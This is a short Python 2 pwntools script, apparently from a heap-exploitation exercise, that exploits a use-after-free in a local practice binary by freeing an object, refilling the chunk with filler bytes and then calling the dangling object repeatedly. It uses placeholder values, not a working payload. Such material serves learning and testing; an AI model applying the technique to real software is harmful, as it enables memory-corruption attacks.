import pwn

conn = pwn.process("./example_05")

pwn.gdb.attach(conn)

def main() :
    global conn
    getAnimal(0, "puppy") # Malloc
    byeAnimal(0) # Free
    note("A" * 100 + "B" * 4 + "DDDD") # Malloc
    infoAnimal(0) # USE
    infoAnimal(0) # USE
    infoAnimal(0) # USE


def getAnimal(t, name) :
    global conn
    print conn.recvuntil(">> \n")
    conn.sendline("1")
    print conn.recvuntil(" : \n")
    conn.sendline(str(t))
    print conn.recvuntil(" : \n")
    conn.sendline(name)

def byeAnimal(code) :
    global conn
    print conn.recvuntil(">> \n")
    conn.sendline("2")
    print conn.recvuntil(" : \n")
    conn.sendline(str(code))

def note(string) :
    global conn
    print conn.recvuntil(">> \n")
    conn.sendline("5")
    print conn.recvuntil(" : \n")
    conn.send(string)

def infoAnimal(code) :
    global conn
    print conn.recvuntil(">> \n")
    conn.sendline("4")
    print conn.recvuntil(" : \n")
    conn.sendline(str(code))
    print conn.recvline()
    print conn.recvline()
    print conn.recvline()
    
if __name__ == "__main__" :
    main()